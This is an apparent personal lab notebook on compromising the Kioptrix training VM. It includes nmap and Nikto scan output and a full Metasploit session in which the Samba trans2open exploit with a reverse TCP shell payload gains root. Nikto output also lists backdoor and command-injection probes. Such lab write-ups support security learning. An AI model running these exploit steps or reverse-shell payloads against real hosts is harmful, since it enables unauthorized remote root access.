## Box: Kioptrix — Started: 25-09-30

**IP/Host:** MacAddress `00:0c:29:f3:29:37`  |  **Status:** `In-Progress`

### TL;DR

Initial: `exploit/linux/samba/trans2open -> linux/x86/shell_reverse_tcp` . PrivEsc: same as *Initial*.

*Impact Overview*:
- RCE / data exfil / persistence / etc.
### Exploit Lifecycle

1. *Validation*:
    1. Found ip-addr with `arp-scan -l`, match MAC to known MAC above
2. *Scanning/Recon*:
    - We have the following ports open:
        - 22
        - 80
        - 111
        - 139/445 - usu Paired
        - 32768
    - We also know that we are attacking a Linux machine, likely on kernel `Linux 2.4.X` and potentially a Red Hat box
    - `Nikto` found remote CE bugs
        - `Apache/1.3.20` - `Apache 1.x up through 1.2.34` are vulnerable to a remote DoS and possible code execution.
        - `mod_ssl/2.8.4` - `mod_ssl 2.8.7` and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
    - http://192.168.109.129/usage/usage_202510.html
        - `Webalizer Version 2.01` - exploitable?
    - Metasploit enumerated SMB version further
        - `Unix (Samba 2.2.1a)`
    - SSH Version - `OpenSSH 2.9p2 (protocol 1.99)`

3. *Exploits/Findings*:
    - Highest value to lowest value exploit Targets:
        - *Port 80* - the `mod_ssl/2.8.4` finding
            - `mod_ssl 2.8.7` and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
            - **Exploit-db hit** -> OpenFuckV2.c
        - ~~*Port 80* - the `Apache httpd 1.3.20` finding~~
            - EDIT: Struck through because research reveals that it's the vulnerable to the same exploit as the *mod_ssl* finding.
            - `Apache 1.x up 1.2.34` are vulnerable to a remote DoS and possible code execution.
                - Note, that output line is a bit garbled. Therefore *ambig* -> this is unconfirmed, and may not be a finding
            - Less valuable than `mod_ssl` because remote shell is high value, but remote DoS and code exec is lower value in potential pivot, scope, and opsec risk
        - *Port 443*
        - *Port 139/443* - `Unix (Samba 2.2.1a)`
            - **CONFIRMED** vulnerable to Metasploit module `trans2open` => yields `root`
4. *PrivEsc/Persistence*:
5. *Proof — path to flags/screenshot of boxpwn*:

### Findings
- *UNCONFIRMED - Found*: 80 - 00:0c:29:f3:29:37 - 2025-10-01 23:07:50 - Default WebPage -> nmap result: `Apache httpd 1.3.20`

- *UNCONFIRMED - Found*: 443 - 00:0c:29:f3:29:37 - 2025-10-02 00:01:29 - EXTREMELY legacy TLS version, SSLv3/TLS1.0. `nmap` output in [[Kioptrix pwned#Findings sourced from NMAP output|nmap findings output]].


- *UNCONFIRMED - Found*: 80 - IPADDR - 2025-10-02 00:36:04 - Nikto findings:
    - Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
    - mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.

- *UNCONFIRMED - Found*: 80 - 00:0c:29:f3:29:37 - 2025-10-02 20:15:21 - Info Disclosure -> Server headers

![[Pasted image 20251005004400.png]]


### Commands Learned

`arp-scan -l` - list all mac addresses on this network
`nikto -h` - IPADDR


## Scratchpad

Full Command Trace of Scanning runs:
```shell

## The CTF Special

┌──(kali㉿kali)-[~]
└─$ nmap -T4 -p- -A 192.168.109.129  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 23:03 EDT
Nmap scan report for 192.168.109.129
Host is up (0.00038s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: wMYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2025-10-01T03:04:14+00:00; +5s from scanner time.
|_http-title: 400 Bad Request
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:F3:29:37 (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 4s

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 192.168.109.129

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.04 seconds


## Get thee to a UDP
┌──(kali㉿kali)-[~]
└─$ nmap -sU -T4 192.168.109.129  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 23:13 EDT
Stats: 0:09:16 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 59.64% done; ETC: 23:29 (0:06:17 remaining)
Stats: 0:09:17 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 59.74% done; ETC: 23:29 (0:06:16 remaining)
Stats: 0:10:36 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 67.23% done; ETC: 23:29 (0:05:11 remaining)
Stats: 0:10:37 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 67.33% done; ETC: 23:29 (0:05:10 remaining)
Nmap scan report for 192.168.109.129
Host is up (0.00028s latency).
Not shown: 955 closed udp ports (port-unreach), 42 open|filtered udp ports (no-response)
PORT      STATE SERVICE
111/udp   open  rpcbind
137/udp   open  netbios-ns
32768/udp open  omad
MAC Address: 00:0C:29:F3:29:37 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1031.92 seconds

```


### Findings sourced from NMAP output


```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p 443 --script ssl-enum-ciphers 192.168.109.129
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 23:19 EDT
Nmap scan report for 192.168.109.129
Host is up (0.00017s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-enum-ciphers: 
|   SSLv3: 
|     ciphers: 
|       TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA (dh 512) - F
|       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_DES_CBC_SHA (dh 1024) - F
|       TLS_RSA_EXPORT1024_WITH_DES_CBC_SHA (rsa 1024) - F
|       TLS_RSA_EXPORT1024_WITH_RC2_CBC_56_MD5 (rsa 1024) - F
|       TLS_RSA_EXPORT1024_WITH_RC4_56_MD5 (rsa 1024) - F
|       TLS_RSA_EXPORT1024_WITH_RC4_56_SHA (rsa 1024) - F
|       TLS_RSA_EXPORT_WITH_DES40_CBC_SHA (rsa 64) - F
|       TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 (rsa 64) - F
|       TLS_RSA_EXPORT_WITH_RC4_40_MD5 (rsa 64) - F
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 1024) - F
|       TLS_RSA_WITH_DES_CBC_SHA (rsa 1024) - F
|       TLS_RSA_WITH_RC4_128_MD5 (rsa 1024) - F
|       TLS_RSA_WITH_RC4_128_SHA (rsa 1024) - F
|     compressors: 
|       NULL
|     cipher preference: client
|     warnings: 
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|       64-bit block cipher DES vulnerable to SWEET32 attack
|       64-bit block cipher DES40 vulnerable to SWEET32 attack
|       64-bit block cipher RC2 vulnerable to SWEET32 attack
|       Broken cipher RC4 is deprecated by RFC 7465
|       CBC-mode cipher in SSLv3 (CVE-2014-3566)
|       Ciphersuite uses MD5 for message integrity
|       Export key exchange
|       Insecure certificate signature (MD5), score capped at F
|   TLSv1.0: 
|     ciphers: 
|       TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA (dh 512) - F
|       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F
|       TLS_DHE_RSA_WITH_DES_CBC_SHA (dh 1024) - F
|       TLS_RSA_EXPORT1024_WITH_DES_CBC_SHA (rsa 1024) - F
|       TLS_RSA_EXPORT1024_WITH_RC2_CBC_56_MD5 (rsa 1024) - F
|       TLS_RSA_EXPORT1024_WITH_RC4_56_MD5 (rsa 1024) - F
|       TLS_RSA_EXPORT1024_WITH_RC4_56_SHA (rsa 1024) - F
|       TLS_RSA_EXPORT_WITH_DES40_CBC_SHA (rsa 64) - F
|       TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 (rsa 64) - F
|       TLS_RSA_EXPORT_WITH_RC4_40_MD5 (rsa 64) - F
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 1024) - F
|       TLS_RSA_WITH_DES_CBC_SHA (rsa 1024) - F
|       TLS_RSA_WITH_RC4_128_MD5 (rsa 1024) - F
|       TLS_RSA_WITH_RC4_128_SHA (rsa 1024) - F
|     compressors: 
|       NULL
|     cipher preference: client
|     warnings: 
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|       64-bit block cipher DES vulnerable to SWEET32 attack
|       64-bit block cipher DES40 vulnerable to SWEET32 attack
|       64-bit block cipher RC2 vulnerable to SWEET32 attack
|       Broken cipher RC4 is deprecated by RFC 7465
|       Ciphersuite uses MD5 for message integrity
|       Export key exchange
|       Insecure certificate signature (MD5), score capped at F
|_  least strength: F
MAC Address: 00:0C:29:F3:29:37 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
```



### Findings sourced from Nikto output

```shell
┌──(kali㉿kali)-[~/]
└─$ nikto -h http://192.168.109.129 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.109.129
+ Target Hostname:    192.168.109.129
+ Target Port:        80
+ Start Time:         2025-10-02 00:32:57 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
+ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918
+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835
+ /manual/: Directory indexing found.
+ /manual/: Web server manual found.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /test.php: This might be interesting.
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8908 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2025-10-02 00:33:17 (GMT-4) (20 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


### Autopayload (metasploit root)
```bash
Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search trans2open

Matching Modules
================

   #  Name                                                         Disclosure Date  Rank   Check  Description
   -  ----                                                         ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open                               2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open                                 2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
   4    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .      .      .
   5    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .      .      .


Interact with a module by name or index. For example info 5, use 5 or use exploit/solaris/samba/trans2open
After interacting with a module you can manually set a TARGET with set TARGET 'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce'                                                                                                                

msf > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                      s/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.109.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf exploit(linux/samba/trans2open) > set rhosts 192.168.109.129
rhosts => 192.168.109.129
msf exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.109.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                      s/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.109.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf exploit(linux/samba/trans2open) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Samba 2.2.x - Bruteforce


msf exploit(linux/samba/trans2open) > run
[*] Started reverse TCP handler on 192.168.109.128:4444 
[*] 192.168.109.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.109.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.109.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.109.129:139 - Trying return address 0xbffffafc...
[*] Sending stage (1062760 bytes) to 192.168.109.129
[*] 192.168.109.129 - Meterpreter session 1 closed.  Reason: Died
[*] 192.168.109.129:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1062760 bytes) to 192.168.109.129
[*] 192.168.109.129 - Meterpreter session 2 closed.  Reason: Died
[*] 192.168.109.129:139 - Trying return address 0xbffff8fc...
[*] Sending stage (1062760 bytes) to 192.168.109.129
[*] 192.168.109.129 - Meterpreter session 3 closed.  Reason: Died
[*] 192.168.109.129:139 - Trying return address 0xbffff7fc...
[*] Sending stage (1062760 bytes) to 192.168.109.129
[*] 192.168.109.129 - Meterpreter session 4 closed.  Reason: Died
[*] 192.168.109.129:139 - Trying return address 0xbffff6fc...
[*] 192.168.109.129:139 - Trying return address 0xbffff5fc...
[*] 192.168.109.129:139 - Trying return address 0xbffff4fc...
^C[-] 192.168.109.129:139 - Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf exploit(linux/samba/trans2open) > 
[-] Meterpreter session 1 is not valid and will be closed
[-] Meterpreter session 2 is not valid and will be closed
[-] Meterpreter session 3 is not valid and will be closed
[-] Meterpreter session 4 is not valid and will be closed
options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.109.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                      s/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.109.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf exploit(linux/samba/trans2open) > set payload linux/x86/
set payload linux/x86/adduser                         set payload linux/x86/shell/bind_ipv6_tcp
set payload linux/x86/chmod                           set payload linux/x86/shell/bind_ipv6_tcp_uuid
set payload linux/x86/exec                            set payload linux/x86/shell/bind_nonx_tcp
set payload linux/x86/meterpreter/bind_ipv6_tcp       set payload linux/x86/shell/bind_tcp
set payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  set payload linux/x86/shell/bind_tcp_uuid
set payload linux/x86/meterpreter/bind_nonx_tcp       set payload linux/x86/shell/reverse_ipv6_tcp
set payload linux/x86/meterpreter/bind_tcp            set payload linux/x86/shell/reverse_nonx_tcp
set payload linux/x86/meterpreter/bind_tcp_uuid       set payload linux/x86/shell/reverse_tcp
set payload linux/x86/meterpreter/reverse_ipv6_tcp    set payload linux/x86/shell/reverse_tcp_uuid
set payload linux/x86/meterpreter/reverse_nonx_tcp    set payload linux/x86/shell_bind_ipv6_tcp
set payload linux/x86/meterpreter/reverse_tcp         set payload linux/x86/shell_bind_tcp
set payload linux/x86/meterpreter/reverse_tcp_uuid    set payload linux/x86/shell_bind_tcp_random_port
set payload linux/x86/metsvc_bind_tcp                 set payload linux/x86/shell_reverse_tcp
set payload linux/x86/metsvc_reverse_tcp              set payload linux/x86/shell_reverse_tcp_ipv6
set payload linux/x86/read_file                       
msf exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.109.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                      s/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  192.168.109.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf exploit(linux/samba/trans2open) > run
[*] Started reverse TCP handler on 192.168.109.128:4444 
[*] 192.168.109.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.109.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.109.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.109.129:139 - Trying return address 0xbffffafc...
[*] 192.168.109.129:139 - Trying return address 0xbffff9fc...
[*] 192.168.109.129:139 - Trying return address 0xbffff8fc...
[*] 192.168.109.129:139 - Trying return address 0xbffff7fc...
[*] 192.168.109.129:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (192.168.109.128:4444 -> 192.168.109.129:32773) at 2025-10-11 18:02:08 -0400

[*] Command shell session 6 opened (192.168.109.128:4444 -> 192.168.109.129:32774) at 2025-10-11 18:02:09 -0400
wh[*] Command shell session 7 opened (192.168.109.128:4444 -> 192.168.109.129:32775) at 2025-10-11 18:02:11 -0400
oami[*] Command shell session 8 opened (192.168.109.128:4444 -> 192.168.109.129:32776) at 2025-10-11 18:02:12 -0400
whoami 
//bin/sh: whowhoami: command not found
whoami
root

```